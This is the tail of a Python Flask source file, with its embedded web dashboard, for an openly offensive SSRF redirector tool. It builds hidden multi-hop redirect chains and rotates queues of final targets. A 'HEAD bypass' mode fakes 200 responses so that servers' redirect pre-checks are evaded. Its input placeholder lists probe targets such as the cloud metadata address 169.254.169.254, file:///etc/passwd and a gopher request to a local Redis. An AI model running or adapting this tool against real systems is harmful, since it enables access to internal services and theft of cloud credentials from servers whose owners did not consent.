                                <span class="queue-badge queue-badge-count">共 ${queue.length} 条</span>
                                <span>当前索引: ${queueIndex} / ${queue.length}</span>
                                <span style="color:var(--text-muted);">模式: ${queueMode === 'sequential' ? '顺序' : '循环'}</span>
                            </div>
                            <div style="margin-top:8px;font-size:13px;color:var(--text-muted);">
                                当前将响应: <span style="color:var(--accent-yellow);">${escapeHtml(queue[queueIndex % queue.length] || '(已耗尽)')}</span>
                            </div>`;
                    }

                    return `
                    <div class="chain-item" id="chain-${chain.id}">
                        <div class="chain-item-header">
                            <span class="chain-item-id">🔗 ${chain.id} ${headBypassBadge}</span>
                            <span class="chain-item-time">${chain.created_at}</span>
                        </div>
                        <div class="chain-item-steps">${stepsHtml}</div>
                        <div style="font-size:13px;color:var(--text-muted);margin-bottom:6px;">入口: <span style="color:var(--accent-yellow);">${escapeHtml(firstUrl)}</span></div>
                        <div style="font-size:13px;color:var(--text-muted);margin-bottom:6px;">末跳:</div>
                        <div class="chain-item-final">${escapeHtml(lastTarget)}</div>
                        ${queueHtml}
                        <div class="chain-item-actions" style="margin-top:12px;">
                            <input type="text" class="chain-edit-input" id="chain-edit-${chain.id}" value="${escapeHtml(lastTarget)}" placeholder="修改末跳URL">
                            <button class="chain-edit-btn chain-save-btn" onclick="updateChainLastTarget('${chain.id}')">💾 保存</button>
                            <button class="chain-edit-btn chain-copy-btn" onclick="doCopy('${escapeHtml(firstUrl)}', '✅ 已复制!')">📋 首跳</button>
                            <button class="chain-edit-btn" style="background:var(--accent-cyan);color:#0d1117;" onclick="toggleChainHeadBypass('${chain.id}', ${!headBypass})">${headBypass ? '🚫 关闭HEAD伪装' : '🔀 开启HEAD伪装'}</button>
                            <button class="chain-edit-btn chain-delete-btn" onclick="deleteChain('${chain.id}')">🗑 删除</button>
                        </div>
                        <!-- 批量队列区 -->
                        <div class="queue-section">
                            <h4>📦 批量队列投递 (每次请求按顺序响应不同POC)</h4>
                            
                            <div class="queue-presets-section">
                                <div class="preset-title">⚡ 快捷预填充模块 (点击自动填充对应探测Payload)</div>
                                <div class="preset-btns">
                                    ${buildPresetButtons(chain.id)}
                                </div>
                                <div class="preset-desc" id="preset-desc-${chain.id}"></div>
                            </div>
                            
                            <div class="queue-mode-label">
                                <span>模式:</span>
                                <select id="queue-mode-${chain.id}" style="width:auto;padding:6px 10px;font-size:13px;">
                                    <option value="sequential" ${queueMode==='sequential'?'selected':''}>顺序 (用完停止)</option>
                                    <option value="loop" ${queueMode==='loop'?'selected':''}>循环 (无限轮转)</option>
                                </select>
                            </div>
                            <textarea class="queue-textarea" id="queue-input-${chain.id}" placeholder="每行一个目标URL，支持任意协议&#10;例如:&#10;http://169.254.169.254/latest/meta-data/&#10;file:///etc/passwd&#10;gopher://127.0.0.1:6379/_INFO">${queue.join('\\n')}</textarea>
                            <div style="display:flex;gap:8px;flex-wrap:wrap;">
                                <button class="chain-edit-btn chain-save-btn" onclick="saveQueue('${chain.id}')">💾 保存队列</button>
                                <button class="chain-edit-btn" style="background:var(--accent-yellow);color:#0d1117;" onclick="resetQueueIndex('${chain.id}')">🔄 重置索引</button>
                                <button class="chain-edit-btn" style="background:var(--accent-red);color:#fff;" onclick="clearQueue('${chain.id}')">🗑 清空队列</button>
                            </div>
                        </div>
                    </div>`;
                }).join('');
            } catch(e) { console.error('刷新失败:', e); }
        }

        async function toggleChainHeadBypass(chainId, enable) {
            try {
                const res = await fetch(`/api/stateful_chains/${chainId}/head_bypass`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ enabled: enable }) });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert(enable ? '✅ HEAD伪装已开启' : '✅ HEAD伪装已关闭'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function updateChainLastTarget(chainId) {
            const input = document.getElementById(`chain-edit-${chainId}`);
            const newTarget = input.value.trim();
            if (!newTarget) return alert('URL不能为空');
            try {
                const res = await fetch(`/api/stateful_chains/${chainId}/last_target`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ target: newTarget }) });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert('✅ 已更新'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function deleteChain(chainId) {
            if (!confirm('确定删除此链？')) return;
            try {
                const res = await fetch(`/api/stateful_chains/${chainId}`, { method: 'DELETE' });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert('✅ 已删除'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function saveQueue(chainId) {
            const textarea = document.getElementById(`queue-input-${chainId}`);
            const modeSelect = document.getElementById(`queue-mode-${chainId}`);
            const lines = textarea.value.split('\\n').map(l => l.trim()).filter(l => l.length > 0);
            const mode = modeSelect.value;
            try {
                const res = await fetch(`/api/stateful_chains/${chainId}/queue`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ targets: lines, mode: mode }) });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert(`✅ 队列已保存 (${lines.length} 条)`); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function resetQueueIndex(chainId) {
            try {
                const res = await fetch(`/api/stateful_chains/${chainId}/queue/reset`, { method: 'POST' });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert('✅ 索引已重置为0'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function clearQueue(chainId) {
            if (!confirm('确定清空队列？将恢复为单一目标模式。')) return;
            try {
                const res = await fetch(`/api/stateful_chains/${chainId}/queue`, { method: 'DELETE' });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert('✅ 队列已清空'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        // ========== 日志 ==========
        async function refreshLogs() {
            const expandedIds = new Set();
            document.querySelectorAll('.log-entry .log-ext[style*="display: block"]').forEach(ext => {
                const entry = ext.closest('.log-entry');
                if (entry && entry.dataset.logid) expandedIds.add(entry.dataset.logid);
            });
            try {
                const res = await fetch('/api/logs'); const data = await res.json();
                const visibleLogs = data.logs.filter(l => !hiddenLogIds.has(l.id));
                document.getElementById('totalLogs').textContent = visibleLogs.length;
                document.getElementById('uniqueIPs').textContent = new Set(visibleLogs.map(l=>l.ip)).size;
                const box = document.getElementById('logsContainer');
                if(visibleLogs.length === 0) { box.innerHTML = '<div style="text-align:center;padding:50px;color:var(--text-muted);font-size:15px;">等待流量...</div>'; return; }
                box.innerHTML = visibleLogs.map(l => {
                    const mClass = `method-${l.method}`;
                    const respHeaders = l.response_headers || {};
                    const respBody = l.response_body || '';
                    const reqHeaders = l.headers || {};
                    const isExpanded = expandedIds.has(l.id);
                    const params = new URLSearchParams(l.args).toString();
                    const queryString = params ? '?' + params : '';
                    const isHeadBypass = l.extra_data && l.extra_data.head_bypass_triggered;
                    const headBypassClass = isHeadBypass ? 'log-head-bypass' : '';
                    let rawRequest = `${l.method} ${l.path}${queryString} HTTP/1.1\\r\\n`;
                    for (const [key, value] of Object.entries(reqHeaders)) rawRequest += `${key}: ${value}\\r\\n`;
                    rawRequest += `\\r\\n`; if (l.request_body) rawRequest += l.request_body;
                    let rawResponse = `HTTP/1.1 ${l.status_code || '000'} OK\\r\\n`;
                    for (const [key, value] of Object.entries(respHeaders)) rawResponse += `${key}: ${value}\\r\\n`;
                    rawResponse += `\\r\\n`; if (respBody) rawResponse += respBody;
                    const headBadge = isHeadBypass ? '<span style="background:rgba(57,213,255,0.12);color:var(--accent-cyan);padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;margin-left:6px;">HEAD伪装</span>' : '';
                    return `
                    <div class="log-entry ${headBypassClass}" data-logid="${l.id}" onclick="const ext=this.querySelector('.log-ext');ext.style.display=ext.style.display==='none'?'block':'none';">
                        <button class="delete-log-btn" onclick="event.stopPropagation();hideLog('${l.id}')" title="隐藏">✕</button>
                        <div class="log-header">
                            <span class="log-ip">${l.ip}</span>
                            <span><span class="method-badge ${mClass}">${l.method}</span>${headBadge}<span style="color:var(--text-muted);font-size:12px;">${l.timestamp}</span></span>
                        </div>
                        <div class="log-detail">
                            <span class="log-label">路径:</span><span class="log-value url">${l.path}${queryString}</span>
                            ${l.redirect_url ? `<span class="log-label">跳向:</span><span class="log-value url">→ ${escapeHtml(l.redirect_url)}</span>` : ''}
                            ${isHeadBypass ? `<span class="log-label">伪装:</span><span class="log-value" style="color:var(--accent-cyan);">HEAD探测 → 返回 ${l.status_code} (伪装通过)</span>` : ''}
                        </div>
                        <div class="log-ext" style="display:${isExpanded?'block':'none'};margin-top:12px;padding-top:12px;border-top:1px dashed rgba(88,166,255,0.15);" onclick="event.stopPropagation()">
                            <div style="margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
                                <strong style="color:var(--accent-green);font-size:12px;">📥 请求</strong>
                                <button class="copy-raw-btn" onclick="event.stopPropagation();copyRawContent(this)">📋</button>
                            </div>
                            <pre class="log-pre">${escapeHtml(rawRequest)}</pre>
                            <div style="margin:10px 0;display:flex;justify-content:space-between;align-items:center;">
                                <strong style="color:var(--accent);font-size:12px;">📤 响应</strong>
                                <button class="copy-raw-btn" onclick="event.stopPropagation();copyRawContent(this)">📋</button>
                            </div>
                            <pre class="log-pre">${escapeHtml(rawResponse)}</pre>
                        </div>
                    </div>`;
                }).join('');
            } catch(e) {}
        }

        function hideLog(logId) {
            hiddenLogIds.add(logId);
            const entry = document.querySelector(`.log-entry[data-logid="${logId}"]`);
            if (entry) { entry.style.transition='opacity 0.3s';entry.style.opacity='0';setTimeout(()=>{entry.remove();const r=document.querySelectorAll('.log-entry');document.getElementById('totalLogs').textContent=r.length;if(r.length===0)document.getElementById('logsContainer').innerHTML='<div style="text-align:center;padding:50px;color:var(--text-muted);font-size:15px;">等待流量...</div>';},300); }
        }

        function clearAllLogs() {
            if (!confirm('清空前端日志显示？')) return;
            document.querySelectorAll('.log-entry').forEach(e => { if(e.dataset.logid) hiddenLogIds.add(e.dataset.logid); });
            document.getElementById('logsContainer').innerHTML = '<div style="text-align:center;padding:50px;color:var(--text-muted);font-size:15px;">等待流量...</div>';
            document.getElementById('totalLogs').textContent = '0'; document.getElementById('uniqueIPs').textContent = '0';
        }

        function copyRawContent(btn) {
            const pre = btn.parentElement.nextElementSibling;
            if (!pre) return;
            doCopy(pre.textContent, '✅ 已复制!');
        }

        document.getElementById('manualRefreshBtn').addEventListener('click', refreshLogs);
        refreshLogs();
        refreshChains();
    </script>
</body>
</html>
"""

# ==================== 路由逻辑 ====================
@app.route('/')
def index():
    if not check_access_token(): return 'Unauthorized', 401
    poc_json = json.dumps(POC_LIST, ensure_ascii=False)
    queue_presets_json = json.dumps(QUEUE_PRESETS, ensure_ascii=False)
    return render_template_string(INDEX_HTML, poc_json=poc_json, poc_count=len(POC_LIST), queue_presets_json=queue_presets_json)

@app.route('/r', methods=SUPPORTED_METHODS)
def basic_redirect():
    log_entry = log_request()
    status_code = int(request.args.get('code', CONFIG['default_status_code']))
    target_url = request.args.get('url', '')
    head_bypass = request.args.get('hb', '0')
    
    if status_code not in VALID_30X_CODES: status_code = CONFIG['default_status_code']
    
    # HEAD伪装逻辑：如果启用了hb且请求方法是HEAD，则返回伪装的200响应
    if should_bypass_head(head_bypass) and request.method == 'HEAD':
        hb_status = int(request.args.get('hb_status', HEAD_BYPASS_CONFIG['status_code']))
        hb_ct = request.args.get('hb_ct', HEAD_BYPASS_CONFIG['content_type'])
        hb_cl = request.args.get('hb_cl', HEAD_BYPASS_CONFIG['fake_content_length'])
        
        response = make_response('', hb_status)
        response.headers['Content-Type'] = hb_ct
        response.headers['Content-Length'] = hb_cl
        for k, v in HEAD_BYPASS_CONFIG['extra_headers'].items():
            response.headers[k] = v
        
        log_entry['redirect_url'] = f'[HEAD伪装绕过 → 返回{hb_status}, 实际目标: {target_url}]'
        log_entry['extra_data'] = {'head_bypass_triggered': True, 'actual_target': target_url}
    elif not target_url:
        response = make_response('No target URL specified', 400)
    else:
        log_entry['redirect_url'] = target_url
        response = make_response(redirect(target_url, code=status_code))
    
    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route('/c', methods=SUPPORTED_METHODS)
def stateless_chain_handler():
    log_entry = log_request()
    b64_data = request.args.get('b')
    if not b64_data:
        response = make_response('Missing chain payload', 400)
    else:
        try:
            padding = '=' * ((4 - len(b64_data) % 4) % 4)
            safe_b64 = b64_data.replace('-', '+').replace('_', '/') + padding
            decoded_bytes = base64.b64decode(safe_b64)
            chain_data = json.loads(decoded_bytes.decode('utf-8'))
            
            steps = chain_data.get('s', [])
            chain_head_bypass = chain_data.get('hb', 0)  # 链级别HEAD伪装标记
            
            if not steps:
                response = make_response('Empty chain steps', 400)
            # HEAD伪装：如果链启用了hb且方法是HEAD
            elif should_bypass_head(chain_head_bypass) and request.method == 'HEAD':
                response = make_head_bypass_response()
                log_entry['redirect_url'] = '[HEAD伪装绕过 → 返回200 (无状态链)]'
                log_entry['extra_data'] = {'head_bypass_triggered': True, 'chain_type': 'stateless'}
            else:
                current_step = steps.pop(0)
                status_code = int(current_step.get('c', 302))
                target_url = current_step.get('t', '')
                
                if steps:
                    remaining_data = {'s': steps}
                    # 传递hb标记到下一跳
                    if chain_head_bypass:
                        remaining_data['hb'] = 1
                    remaining_json = json.dumps(remaining_data, separators=(',', ':'))
                    remaining_b64 = base64.urlsafe_b64encode(remaining_json.encode('utf-8')).decode('utf-8').rstrip('=')
                    
                    host_url = request.url_root.rstrip('/')
                    if not target_url.startswith('http'): target_url = host_url
                    separator = '&' if '?' in target_url else '?'
                    next_url = f"{target_url}{separator}b={remaining_b64}"
                    if target_url.strip('/') == host_url.strip('/'): next_url = f"{host_url}/c?b={remaining_b64}"
                else:
                    next_url = target_url
                    
                log_entry['redirect_url'] = next_url
                response = make_response(redirect(next_url, code=status_code))
        except Exception as e:
            response = jsonify({'error': f'Chain decode failed: {str(e)}'})
            response.status_code = 400

    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route('/api/create_stateful_chain', methods=['POST'])
def create_stateful_chain():
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        data = request.get_json(force=True)
        steps_input = data.get('steps', [])
        final_target = data.get('final_target', '')
        base_url = data.get('base_url', request.url_root.rstrip('/'))
        head_bypass = data.get('head_bypass', False)
    except:
        return jsonify({'error': 'Invalid JSON'}), 400
    
    if not steps_input or len(steps_input) == 0:
        return jsonify({'error': 'At least one step required'}), 400
    
    for step in steps_input:
        path = step.get('path', '')
        if not path.startswith('/'):
            return jsonify({'error': f'Invalid path: {path}'}), 400
        reserved = ['/', '/r', '/c', '/api/logs', '/api/create_stateful_chain', '/api/stateful_chains']
        if path in reserved or path.startswith('/api/'):
            return jsonify({'error': f'Path "{path}" is reserved'}), 400
        if path in PATH_MAP:
            return jsonify({'error': f'Path "{path}" already in use by another chain'}), 400
    
    chain_id = str(uuid.uuid4())[:8]
    steps = []
    for i, s in enumerate(steps_input):
        path = s['path']
        code = int(s.get('code', 302))
        if code not in VALID_30X_CODES:
            code = 302
        
        is_final = (i == len(steps_input) - 1)
        if is_final:
            if not final_target:
                return jsonify({'error': 'Final step requires final_target'}), 400
            target = final_target
        else:
            next_path = steps_input[i+1]['path']
            target = f"{base_url}{next_path}"
        
        steps.append({
            'path': path,
            'code': code,
            'target': target
        })
        PATH_MAP[path] = (chain_id, i)
    
    STATEFUL_CHAINS[chain_id] = {
        'id': chain_id,
        'steps': steps,
        'created_at': get_beijing_time(),
        'targets_queue': [],
        'queue_index': 0,
        'queue_mode': 'sequential',
        'head_bypass': bool(head_bypass)  # HEAD伪装开关
    }
    
    first_url = f"{base_url}{steps[0]['path']}"
    return jsonify({'chain_id': chain_id, 'first_url': first_url, 'step_count': len(steps), 'head_bypass': bool(head_bypass)})

# ==================== 有状态链管理 API ====================
@app.route('/api/stateful_chains', methods=['GET'])
def list_stateful_chains():
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    chains = list(STATEFUL_CHAINS.values())
    return jsonify({'chains': chains, 'total': len(chains)})

@app.route('/api/stateful_chains/<chain_id>', methods=['DELETE'])
def delete_stateful_chain(chain_id):
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    
    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404
    
    for step in chain['steps']:
        path = step['path']
        if path in PATH_MAP:
            del PATH_MAP[path]
    
    del STATEFUL_CHAINS[chain_id]
    return jsonify({'message': f'Chain {chain_id} deleted successfully', 'remaining': len(STATEFUL_CHAINS)})

@app.route('/api/stateful_chains/<chain_id>/last_target', methods=['PUT'])
def update_chain_last_target(chain_id):
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    
    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404
    
    try:
        data = request.get_json(force=True)
        new_target = data.get('target', '').strip()
    except:
        return jsonify({'error': 'Invalid JSON'}), 400
    
    if not new_target:
        return jsonify({'error': 'Target URL cannot be empty'}), 400
    
    last_index = len(chain['steps']) - 1
    old_target = chain['steps'][last_index]['target']
    chain['steps'][last_index]['target'] = new_target
    
    return jsonify({
        'message': 'Last target updated successfully',
        'chain_id': chain_id,
        'old_target': old_target,
        'new_target': new_target
    })

# ==================== HEAD伪装开关 API ====================
@app.route('/api/stateful_chains/<chain_id>/head_bypass', methods=['PUT'])
def update_chain_head_bypass(chain_id):
    """开启/关闭有状态链的HEAD伪装模式"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    
    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404
    
    try:
        data = request.get_json(force=True)
        enabled = data.get('enabled', False)
    except:
        return jsonify({'error': 'Invalid JSON'}), 400
    
    chain['head_bypass'] = bool(enabled)
    
    return jsonify({
        'message': f'HEAD bypass {"enabled" if enabled else "disabled"} for chain {chain_id}',
        'chain_id': chain_id,
        'head_bypass': chain['head_bypass']
    })

# ==================== 批量队列 API ====================
@app.route('/api/stateful_chains/<chain_id>/queue', methods=['PUT'])
def update_chain_queue(chain_id):
    """设置/更新有状态链的批量目标队列"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    
    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404
    
    try:
        data = request.get_json(force=True)
        targets = data.get('targets', [])
        mode = data.get('mode', 'sequential')
    except:
        return jsonify({'error': 'Invalid JSON'}), 400
    
    if not isinstance(targets, list):
        return jsonify({'error': 'targets must be a list'}), 400
    
    if mode not in ('sequential', 'loop'):
        mode = 'sequential'
    
    targets = [t.strip() for t in targets if t.strip()]
    
    chain['targets_queue'] = targets
    chain['queue_index'] = 0
    chain['queue_mode'] = mode
    
    if targets:
        last_index = len(chain['steps']) - 1
        chain['steps'][last_index]['target'] = targets[0]
    
    return jsonify({
        'message': 'Queue updated successfully',
        'chain_id': chain_id,
        'queue_length': len(targets),
        'mode': mode
    })

@app.route('/api/stateful_chains/<chain_id>/queue', methods=['DELETE'])
def clear_chain_queue(chain_id):
    """清空队列，恢复为单一目标模式"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    
    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404
    
    chain['targets_queue'] = []
    chain['queue_index'] = 0
    
    return jsonify({'message': 'Queue cleared', 'chain_id': chain_id})

@app.route('/api/stateful_chains/<chain_id>/queue/reset', methods=['POST'])
def reset_chain_queue_index(chain_id):
    """重置队列索引为0"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    
    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404
    
    chain['queue_index'] = 0
    
    if chain['targets_queue']:
        last_index = len(chain['steps']) - 1
        chain['steps'][last_index]['target'] = chain['targets_queue'][0]
    
    return jsonify({'message': 'Queue index reset to 0', 'chain_id': chain_id})

# ==================== 队列预设 API ====================
@app.route('/api/queue_presets', methods=['GET'])
def get_queue_presets():
    """获取所有队列预设模板"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'presets': QUEUE_PRESETS})

@app.route('/<path:custom_path>', methods=SUPPORTED_METHODS)
def handle_stateful_path(custom_path):
    path = '/' + custom_path if not custom_path.startswith('/') else custom_path
    log_entry = log_request()
    
    if path in PATH_MAP:
        chain_id, step_index = PATH_MAP[path]
        chain = STATEFUL_CHAINS.get(chain_id)
        if not chain:
            response = make_response('Chain expired or not found', 404)
        else:
            step = chain['steps'][step_index]
            code = step['code']
            
            # HEAD伪装检查：如果链启用了head_bypass且请求方法是HEAD
            chain_head_bypass = chain.get('head_bypass', False)
            if chain_head_bypass and request.method == 'HEAD':
                response = make_head_bypass_response()
                log_entry['redirect_url'] = f'[HEAD伪装绕过 → 返回200, 路径: {path}]'
                log_entry['extra_data'] = {
                    'head_bypass_triggered': True,
                    'chain_id': chain_id,
                    'step_index': step_index,
                    'path': path,
                    'actual_target': step['target']
                }
            else:
                # 正常重定向逻辑
                is_last_step = (step_index == len(chain['steps']) - 1)
                queue = chain.get('targets_queue', [])
                
                if is_last_step and queue:
                    queue_index = chain.get('queue_index', 0)
                    queue_mode = chain.get('queue_mode', 'sequential')
                    
                    if queue_mode == 'loop':
                        target = queue[queue_index % len(queue)]
                        chain['queue_index'] = (queue_index + 1) % len(queue)
                    else:
                        if queue_index < len(queue):
                            target = queue[queue_index]
                            chain['queue_index'] = queue_index + 1
                        else:
                            target = queue[-1]
                    
                    step['target'] = target
                else:
                    target = step['target']
                
                response = make_response(redirect(target, code=code))
                log_entry['redirect_url'] = target
                log_entry['extra_data'] = {
                    'chain_id': chain_id, 
                    'step_index': step_index, 
                    'path': path,
                    'queue_index': chain.get('queue_index', 0) if is_last_step and queue else None,
                    'head_bypass_enabled': chain_head_bypass
                }
    else:
        response = make_response('Not Found', 404)
    
    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route('/api/logs', methods=['GET'])
def get_logs():
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'logs': LOGS[:50], 'total': len(LOGS)})

if __name__ == '__main__':
    print(f"🚀 SSRF 实战 30x Redirector 引擎启动成功")
    print(f"📍 访问地址: http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"🛡️ 已深度集成 K8s / Docker 云原生 POST 自动化检测")
    print(f"🔒 有状态路径隐藏链已就绪 (支持实时查看/删除/修改末跳)")
    print(f"📦 批量队列投递模式已启用 (顺序/循环)")
    print(f"⚡ 队列预填充模块: {len(QUEUE_PRESETS)} 个探测分类已加载")
    print(f"🔧 Burp风格Raw HTTP请求编辑器已启用")
    print(f"✏️ 基础跳转 / 智能链 / 有状态链 均已启用高级请求编辑")
    print(f"🔀 HEAD伪装绕过模式已启用 (解决服务器HEAD预检拒绝30x问题)")
    print(f"📋 日志删除仅前端隐藏，后端数据完整保留")
    print(f"🕐 日志时间显示为北京时间 (UTC+8)")
    app.run(host=CONFIG['host'], port=CONFIG['port'], debug=False, threaded=True)
